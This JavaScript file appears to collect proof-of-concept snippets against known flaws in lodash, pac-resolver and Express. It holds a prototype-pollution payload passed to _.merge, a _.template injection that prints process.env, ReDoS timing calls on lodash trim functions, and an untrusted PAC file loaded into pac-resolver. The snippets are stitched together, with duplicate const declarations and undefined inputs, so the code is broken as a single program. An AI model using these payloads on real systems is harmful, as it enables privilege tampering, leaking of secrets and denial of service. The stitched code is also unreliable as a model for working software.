var fs = require('fs');
var pac = require('pac-resolver');

var FindProxyForURL = pac(fs.readFileSync('/tmp/proxy.pac')); // Reading from untrusted local file

var lo = require('lodash');

function build_blank (n) {
var ret = "1"
for (var i = 0; i < n; i++) {
ret += " "
}

return ret + "1";
}

var s = build_blank(50000)
var time0 = Date.now();
lo.trim(s)
var time_cost0 = Date.now() - time0;
console.log("[ - ] should be slow: " + time_cost0)

var time1 = Date.now();
lo.toNumber(s)
var time_cost1 = Date.now() - time1;
console.log("[ - ] should be slow: " + time_cost1)

var time2 = Date.now();
lo.trimEnd(s)
var time_cost2 = Date.now() - time2;
console.log("[ - ] shoulde be slow: " + time_cost2)

var _ = require('lodash');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true

const lodash = require('lodash');
var userinput1 = readline();
var userinput2 = readline() + "evil";
lodash.zipObjectDeep(userinput1,userinput2)

_.template('', { variable: '){console.log(process.env)}; with(obj' })()

const express = require('express')

const app = express()  // express is listening
app.get('/', (req, res) => {
  res.send('Hello World!')
})

const express = require('express')
const app = express()


app.get('/', function (req, res) {
  res.download("dontcare", "dontcare", userinput)
})


app.get('/sendfile', function (req, res) {
  res.sendFile("dontcare", userinput)
})